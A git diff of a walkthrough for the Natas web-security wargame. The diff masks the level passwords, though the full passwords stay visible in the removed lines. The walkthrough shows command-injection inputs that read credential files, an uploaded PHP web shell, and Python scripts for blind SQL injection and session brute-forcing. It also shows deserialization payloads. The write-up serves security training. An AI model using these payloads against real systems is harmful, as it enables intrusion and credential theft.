@@ -11,7 +11,7 @@ URL:      http://natas0.natas.labs.overthewire.org
 Looking at the full page source we can find the password at line 16.
 
 ```html
-<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
+<!--The password for natas1 is 0nzC...Iwlq -->
 ```
 
 # 1
@@ -24,7 +24,7 @@ URL:      http://natas1.natas.labs.overthewire.org
 Same as before, but just shift+right click on firefox.
 
 ```html
-<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
+<!--The password for natas2 is TguM...APlI -->
 ```
 
 # 2
@@ -39,7 +39,7 @@ There is nothing in this page except for `<img src="files/pixel.png">`. The imag
 ```
 # username:password
 ...
-natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
+natas3:3gqi...LeYH
 ```
 
 # 3
@@ -57,7 +57,7 @@ The source code mentions `Not even Google will find it this time...` which means
 Checking s3cr3t directory you can use the same method as natas2 as it includes users.txt.
 
 ```
-natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
+natas4:QryZ...UxLQ
 ```
 
 # 4
@@ -72,7 +72,7 @@ We get denied access when visiting the website, saying that `authorized users sh
 Normally you can use burpsuite, but i found a firefox addon called [Referer Modifier](https://addons.mozilla.org/en-US/firefox/addon/referer-modifier/) by Airtower that would let me set the referer as `http://natas5.natas.labs.overthewire.org/` on any website. When doing so we can finally see the password.
 
 ```
-Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK  
+Access granted. The password for natas5 is 0n35...1ToK  
 ```
 
 # 5
@@ -85,7 +85,7 @@ URL:      http://natas5.natas.labs.overthewire.org
 It says we aren't logged in. There's no other way to log in. I checked for any stored data using a cookie editor addon such as [Cookie Quick Manager](https://addons.mozilla.org/en-US/firefox/addon/cookie-quick-manager/), and I found out that there is one boolean cookie named `loggedin` which is set to 0. I set it to 1 which means that I am now considered logged in after refreshing the page.
 
 ```
-Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
+Access granted. The password for natas6 is 0RoJ...Xned
 ```
 
 # 6
@@ -102,7 +102,7 @@ It asks us for a secret key. It also gives us the PHP source code of the checker
 Input that and we get the password.
 
 ```
-Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS 
+Access granted. The password for natas7 is bmg8...e0GS 
 ```
 
 # 7
@@ -115,7 +115,7 @@ URL:      http://natas7.natas.labs.overthewire.org
 The hint in the source code says `password for webuser natas8 is in /etc/natas_webpass/natas8` but going to that directory doesn't work. But clicking on the website buttons take you to `index.php?page=home` and `index.php?page=about` respectiely. So going to `index.php?page=/etc/natas_webpass/natas8` gives us the password.
 
 ```
-xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
+xcoX...Ae5Q
 ```
 
 # 8
@@ -146,7 +146,7 @@ The function first encodes the secret key into base64, then reverses it, and fin
 Enter the key and you will get the password
 
 ```
-Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t 
+Access granted. The password for natas9 is ZE1c...6b6t 
 ```
 
 # 9
@@ -169,7 +169,7 @@ Basically all it does is return all the lines in dictionary.txt that partly cont
 ```
 Output:
 
-t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+t7I5...dmOu
 ```
 
 # 10
@@ -182,7 +182,7 @@ URL:      http://natas10.natas.labs.overthewire.org
 I guess the filter is broken, because our previous solution still works: `. /etc/natas_webpass/natas11 #`
 
 ```
-UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
+UJdq...3lEk
 ```
 
 # 11
@@ -237,7 +237,7 @@ We get our new cookie! `HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5
 Put this in your cookie editor and refresh the page.
 
 ```
-The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
+The password for natas12 is yZdk...zDeB
 ```
 
 # 12
@@ -260,7 +260,7 @@ So all we have to do is inspect element and change the .jpg to .php.
 Once we upload the file, we can run the file by clicking the link. We can then add `?cmd=cat /etc/natas_webpass/natas13` after the file name to see the password.
 
 ```
-trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
+trbs...j3LC
 ```
 
 # 13
@@ -283,7 +283,7 @@ The code now uses exif to check what file type it is. Basically checking the fir
 Once that's done, just follow the same steps as the previous level. Make sure you don't pick up the first four characters. (They may appear as a diamond with a question mark)
 
 ```
-���� z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ 
+���� z3UY...2XtQ 
 ```
 
 # 14
@@ -324,7 +324,7 @@ For the sake of time I just looked for other solutions for this level and took [
 >     'abcdefghijklmnopqrstuvwxyz' +
 >     'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
 > )
-> webauth = ('natas15','SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')
+> webauth = ('natas15','SdqI...lrvx')
 > charset_1 = ''
 > for c in charset_0:
 >     username = ('natas16" AND password LIKE BINARY "%' + c +'%" "')
@@ -354,7 +354,7 @@ For the sake of time I just looked for other solutions for this level and took [
 Once that's done we get the password.
 
 ```
-hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
+hPkj...4sGo
 ```
 
 # 16
@@ -378,7 +378,7 @@ I used the same python code from the previous level, but with some changes.
 >     'abcdefghijklmnopqrstuvwxyz' +
 >     'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
 > )
-> webauth = ('natas16','hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')
+> webauth = ('natas16','hPkj...4sGo')
 > charset_1 = ''
 > 
 > for c in charset_0:
@@ -409,7 +409,7 @@ I used the same python code from the previous level, but with some changes.
 This is the password we get:
 
 ```
-EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
+EqjH...F0OC
 ```
 
 # 17
@@ -424,7 +424,7 @@ This is just natas15 but now it doesn't confirm if we got it right with the text
 We got this password:
 
 ```
-6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
+6OG1...CGgCJ
 ```
 
 # 18
@@ -439,7 +439,7 @@ It looks like a login page where we need to be admin to get the password. Lookin
 ```python
 import requests
 target = 'http://natas18.natas.labs.overthewire.org'
-webauth = ('natas18','6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')
+webauth = ('natas18','6OG1...GgCJ')
 
 for uid in range(640):
     r = requests.get(target,
@@ -455,7 +455,7 @@ for uid in range(640):
 The password we get in session id 119 is
 
 ```
-tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
+tnwE...JqJr
 ```
 
 # 19
@@ -470,7 +470,7 @@ According to the website it is similar to the previous levels except the session
 ```python
 import requests
 target = 'http://natas19.natas.labs.overthewire.org'
-webauth = ('natas19','tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')
+webauth = ('natas19','tnwE...JqJr')
 
 for uid in range(640):
     newid = (str(uid) + "-admin").encode("utf-8").hex()
@@ -487,7 +487,7 @@ for uid in range(640):
 We get this at ID: 281
 
 ```
-p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
+p5mC...MVyw
 ```
 
 # 20
@@ -503,7 +503,7 @@ For this one it seems the cookie is completely random, but the source code chang
 You are an admin. The credentials for the next level are:
 
 Username: natas21
-Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
+Password: BPhv...NfiH
 ```
 
 # 21
@@ -519,7 +519,7 @@ The main website doesn't do anything other than display the password if `admin` 
 You are an admin. The credentials for the next level are:
 
 Username: natas22
-Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
+Password: d8rw...lozz
 ```
 
 # 22
@@ -533,7 +533,7 @@ This one was pretty simple.  All you need to do is pass `?revelio` into the URL.
 
 ```
 You are an admin. The credentials for the next level are:<br><pre>Username: natas23
-Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs</pre>
+Password: dIUQ...8tRs</pre>
 ```
 
 # 23
@@ -548,7 +548,7 @@ This is also pretty simple, it just checks if the given password has `iloveyou` 
 ```
 The credentials for the next level are:
 
-Username: natas24 Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
+Username: natas24 Password: Meuq...YEWd
 ```
 
 # 24
@@ -563,7 +563,7 @@ This website uses `strcmp()` to see if a password is the same as the actual pass
 ```
 The credentials for the next level are:
 
-Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
+Username: natas25 Password: ckEL...JZ4Ws
 ```
 
 # 25
@@ -601,7 +601,7 @@ Another thing about this log is that it parses our user agent for some reason. W
 After changing our user agent and accessing the log file, we get our password in the HTML source.
 
 ```
-[29.12.2023 04::25:03] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
+[29.12.2023 04::25:03] cVXX...aQlE
 ```
 
 # 26
@@ -663,7 +663,7 @@ Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo0MjoiL3Zhci93d3cvbmF0YXMv
 With a cookie editor, replace the `drawing` cookie with this one, and refresh the page. You will know if it works because the website will spit out an error, preventing you from accessing the source code. Access the created log file by going to `/img/natas27Pass.php`, and you'll find the password.
 
 ```
-u3RRffXjysjgwFU6b9xa23i6prmUsYne
+u3RR...sYne
 ```
 
 # 27
@@ -699,7 +699,7 @@ Passing this onto the website will show `User natas28test was created!`, but in 
 ```
 Welcome natas28!
 Here is your data:
-Array ( [username] => natas28 [password] => 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj ) 
+Array ( [username] => natas28 [password] => 1JNw...InVj ) 
 ```
 
 # 28
@@ -725,7 +725,7 @@ The first step I did is figure out how many characters it'll take to fill out th
 import requests
 from urllib.parse import unquote
 target = 'http://natas28.natas.labs.overthewire.org/'
-webauth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')
+webauth = ('natas28', '1JNw...InVj')
 
 letters = 1
 while (letters <= 16):
@@ -761,7 +761,7 @@ After URL encoding the final website should be `http://natas28.natas.labs.overth
 
 ```
 Whack Computer Joke Database
-    31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
+    31F4...ppns
 ```
 
 I'd have no idea how to do this level if not for [this video](https://www.youtube.com/watch?v=oWmfYgCYmCc)
@@ -799,7 +799,7 @@ if(param('file')){
 Though there's an easy way to bypass this by using Bash wildcards. So replacing every `natas` with just an asterisk would do the trick. I put `?file=|cat /etc/*_webpass/*30%00` and got the password.
 
 ```
-WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
+WQhx...6YrH
 ```
 
 # 30
@@ -828,7 +828,7 @@ Since neither passing it through the input nor passing it as an URL get paramete
 ```python
 import requests
 target = "http://natas30.natas.labs.overthewire.org/index.pl"
-webauth = ('natas30', 'WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH')
+webauth = ('natas30', 'WQhx...6YrH')
 
 r = requests.post(target,
 auth = webauth,
@@ -840,7 +840,7 @@ print ((r.text.split("natas31")[-1])[:32])
 Running it gives the password to the next level.
 
 ```
-m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y
+m7bf...Nq0y
 ```
 
 # 31
@@ -865,7 +865,7 @@ I did this in python again, trying to get the website to print the password for 
 ```python
 import requests
 target = "http://natas31.natas.labs.overthewire.org/index.pl"
-webauth = ('natas31', 'm7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y')
+webauth = ('natas31', 'm7bf...Nq0y')
 cmd = "cat /etc/natas_webpass/natas32"
 
 r = requests.post(target + "?" + cmd + " |",
@@ -879,7 +879,7 @@ print (r.text.split('<tr><th>')[-1][:32])
 Doing this will get you the password for the next file
 
 ```
-NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
+NaIWh...QMi0B
 ```
 
 # 32
@@ -891,10 +891,10 @@ URL:      http://natas32.natas.labs.overthewire.org
 
 This is the same website as the previous level, so you can copy the python code from the previous level. However, going to `/etc/natas_webpass/natas32` will not work. It seems the password isn't in that location for some reason. Instead, the website states `This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute.`
 
-Doing `ls .` command will returl all the files in the webroot. I noticed that there's a file called `getpassword`, which I assume is the binary file. Run it by doing `./getpassword`, and you'll get the password for level 33.
+Doing `ls .` command will return all the files in the webroot. I noticed that there's a file called `getpassword`, which I assume is the binary file. Run it by doing `./getpassword`, and you'll get the password for level 33.
 
 ```
-2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
+2v9n...eoCJ
 ```
 
 # 33
@@ -968,19 +968,19 @@ Then, make another PHP file (name is unimportant) with the following code:
 ```php
 <?php
     class Executor {
-	    private $filename = "pass.php"; 
+        private $filename = "pass.php"; 
         private $signature = True;
         private $init = false;
     }
 
-	$phar = new Phar("pass_archive.phar");
-	$phar->startBuffering();
-	$phar->addFromString("test.txt", 'test');
-	$phar->setStub("<?php __HALT_COMPILER(); ?>");
+    $phar = new Phar("pass_archive.phar");
+    $phar->startBuffering();
+    $phar->addFromString("test.txt", 'test');
+    $phar->setStub("<?php __HALT_COMPILER(); ?>");
 
     $o = new Executor();
-	$phar->setMetadata($o);
-	$phar->stopBuffering();
+    $phar->setMetadata($o);
+    $phar->stopBuffering();
 ?>
 ```
 
@@ -996,7 +996,7 @@ You'll get some error messages on top, but the bottom text will show the passwor
 
 ```
 Congratulations! Running firmware update: pass.php
-j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY 
+j4O7...lCJY 
 ```
 
 # 34
